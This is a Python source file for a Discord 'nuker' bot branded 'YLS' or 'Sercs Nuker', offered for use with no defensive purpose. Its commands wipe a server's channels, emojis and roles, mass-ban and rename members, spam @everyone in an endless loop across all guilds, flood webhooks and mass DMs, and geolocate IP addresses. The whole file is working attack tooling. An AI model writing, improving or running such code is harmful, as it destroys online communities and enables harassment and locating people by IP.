_L='hostname'
_K='Geolocation Results:'
_J='Failed to rename the server'
_I='Server renamed successfully!'
_H='timezone'
_G='postal'
_F='city'
_E='region'
_D='country'
_C='ip'
_B=','
_A='loc'
import discord
from discord.ext import commands
import asyncio,sys,logging,time,requests
token=input('Bot Token: ')
intents=discord.Intents.all()
intents.message_content=True
sys.stderr=open('errors.log','w')
discord_logger=logging.getLogger('discord')
discord_logger.setLevel(logging.ERROR)
logging.basicConfig(level=logging.CRITICAL)
intents=discord.Intents.all()
bot=commands.Bot(command_prefix='!',intents=intents)
client=discord.Client(intents=intents)
@bot.event
async def on_ready():print(f"We have logged in as {bot.user}")
@bot.command()
async def nuke(ctx):
	G='Fucked By YLS';A=ctx;await A.message.delete();print('Deleting all emojis...')
	for C in A.guild.emojis:
		try:await C.delete()
		except discord.Forbidden:print(f"Failed to delete emoji {C.name}")
	try:
		for B in A.guild.channels:await B.delete()
		await A.guild.create_text_channel('.')
	except Exception as H:pass
	for D in range(25):
		try:B=await A.guild.create_text_channel(f"FUCKED BY YLS-{D}");await B.send('||@everyone|| GET NUKED FUCKERS BY YLS')
		except discord.Forbidden:print(f"Failed to create channel new-channel-{D}")
	try:await A.guild.edit(name=G);print(_I)
	except discord.Forbidden:print(_J)
	print(f"Renaming all members to FUCKEDBY(YLS)...")
	for E in A.guild.members:
		try:await E.edit(nick=G)
		except discord.Forbidden:print(f"Failed to rename {E.name}")
	print(f"Sending message to all channels")
	while True:
		for F in bot.guilds:
			for B in F.text_channels:
				try:await B.send('||@everyone|| ||@here|| GET NUKED BY YLS!')
				except discord.Forbidden:print(f"Failed to send message to {B.name} in {F.name}")
@bot.command()
async def deletebans(ctx):
	print('Deleting all bans...');B=await ctx.guild.bans()
	for A in B:
		try:await ctx.guild.unban(A.user)
		except discord.Forbidden:print(f"Failed to unban {A.user}")
@bot.command()
async def renameserver(ctx,new_server_name):
	A=new_server_name;await ctx.message.delete();print(f"Renaming the server to {A}...")
	try:await ctx.guild.edit(name=A);print(_I)
	except discord.Forbidden:print(_J)
def run_bot():
	try:bot.run(token);client.run(token)
	except discord.errors.LoginFailure:print('Invalid token. Please try again.')
	except discord.errors.PrivilegedIntentsRequired:print('Bot does not have the required privileged intents enabled.');print("Please enable them in your bot's settings on the Discord Developer Portal.");input('Press any key to exit...')
@bot.command()
async def muteall(ctx):
	await ctx.message.delete();print('Muting all members...')
	for A in ctx.guild.members:
		try:await A.edit(mute=True)
		except discord.Forbidden:print(f"Failed to mute {A.name}")
@bot.command()
async def massban(ctx):
	await ctx.message.delete();print('Mass banning all members... FUCKED BY YLS')
	for A in ctx.guild.members:
		try:await A.ban()
		except discord.Forbidden:print(f"Failed to ban {A.name}")
@bot.command()
async def massunban(ctx):
	A=ctx;await A.message.delete();print('Mass unbanning all members FUCKED BY YLS...');C=await A.guild.bans()
	for B in C:
		try:await A.guild.unban(B.user)
		except discord.Forbidden:print(f"Failed to unban GOD DAMNIT {B.user}")
@bot.command()
async def delchannels(ctx):
	A=ctx;await A.message.delete()
	try:
		for B in A.guild.channels:await B.delete()
		await A.guild.create_text_channel('.')
	except Exception as C:pass
@bot.command()
async def deleteroles(ctx):
	await ctx.message.delete();print('Deleting all roles MADE BY YLS...')
	for A in ctx.guild.roles:
		try:await A.delete()
		except discord.Forbidden:print(f"Failed to delete role MADE BY YLS {A.name}")
@bot.command()
async def createroles(ctx,*,role_name):
	A=role_name;await ctx.message.delete();print(f"Creating roles: {A}")
	for B in range(10):
		try:await ctx.guild.create_role(name=A,color=discord.Color.random())
		except discord.Forbidden:print(f"Failed to create role {A}")
@bot.command()
async def renameall(ctx,new_name):
	A=new_name;await ctx.message.delete();print(f"Renaming all members to {A}...")
	for B in ctx.guild.members:
		time.sleep(.25)
		try:await B.edit(nick=A)
		except discord.Forbidden:print(f"Failed to rename {B.name}")
@bot.command()
async def massdm(ctx,*,message):
	A=message;await ctx.message.delete();print(f"Sending mass DMs: {A}")
	for B in ctx.guild.members:
		try:await B.send(A)
		except discord.Forbidden:print(f"Failed to DM {B.name}")
@bot.command()
async def spamchannels(ctx):
	await ctx.message.delete();print('Spamming channels...')
	for A in range(10):B=await ctx.guild.create_text_channel(f"spam-channel-{A}");await B.send('Spam message!')
@bot.command()
async def lookup(ctx,ip):B=ctx;E=discord.Embed(title='');await B.message.delete();C=f"https://ipinfo.io/{ip}/json";D=requests.get(C);A=D.json();time.sleep(2);await B.send(_K);await B.send(f"IP Address: {A[_C]}");ip=A[_C];F=A[_L];await B.send(f"Country: {A[_D]}");G=A[_D];await B.send(f"Region: {A[_E]}");H=A[_E];await B.send(f"City: {A[_F]}");I=A[_F];await B.send(f"Postal Code: {A[_G]}");await B.send(f"Timezone: {A[_H]}");J=A[_H];K=A[_G];await B.send(f"Latitude: {A[_A].split(_B)[0]}");L=A[_A].split(_B)[0];await B.send(f"Longitude: {A[_A].split(_B)[1]}");M=A[_A].split(_B)[1]
@bot.command()
async def lookuphide(ctx,ip):B=ctx;await B.message.delete();C=f"https://ipinfo.io/{ip}/json";D=requests.get(C);A=D.json();time.sleep(2);await B.author.send(_K);await B.author.send(f"IP Address: {A[_C]}");ip=A[_C];E=A[_L];await B.author.send(f"Country: {A[_D]}");F=A[_D];await B.author.send(f"Region: {A[_E]}");G=A[_E];await B.author.send(f"City: {A[_F]}");H=A[_F];await B.author.send(f"Postal Code: {A[_G]}");await B.author.send(f"Timezone: {A[_H]}");I=A[_H];J=A[_G];await B.author.send(f"Latitude: {A[_A].split(_B)[0]}");K=A[_A].split(_B)[0];await B.author.send(f"Longitude: {A[_A].split(_B)[1]}");L=A[_A].split(_B)[1]
@bot.command()
async def helpcmds(ctx):B=False;await ctx.message.delete();A=discord.Embed(title='Help Command  Thank you for choosing Sercs Nuker HAVE FUN :t_rex:',description='',color=65280);A.add_field(name='!nuke | Nukes the whole server',value='',inline=B);A.add_field(name='----------------------------------------------------',value='',inline=B);A.add_field(name="!massdm (message)      | dm's every user",value='',inline=B);A.add_field(name='!renameserver (name) | changes the name of the server',value='',inline=B);A.add_field(name='!renameall (name) | changes the name of everybody in server',value='',inline=B);A.add_field(name="!lookup (ip)      | geolocate's a ip",value='',inline=B);A.add_field(name='!spamchannels | Makes 10 spam channels',value='',inline=B);A.add_field(name='!spamwebhooks | makes a webhook in every channel and sends a message with the webhook',value='',inline=B);await ctx.send(embed=A)
@bot.command()
async def spam(ctx,message):
	await ctx.message.delete()
	for A in bot.guilds:
		for B in A.channels:
			try:await B.send(message)
			except:pass
@bot.command()
async def spamwebhooks(ctx):
	await ctx.message.delete()
	for C in bot.guilds:
		for A in C.channels:
			if isinstance(A,discord.TextChannel):B=await A.create_webhook(name='monkeybotwebhook');await B.send(content='Nuked by YLS NUKER FUCKING DUMB AS HELL  :t_rex:');await B.delete()
if __name__=='__main__':run_bot()

# THIS WAS MADE BY MONKEY BANANA SHOP (YLS)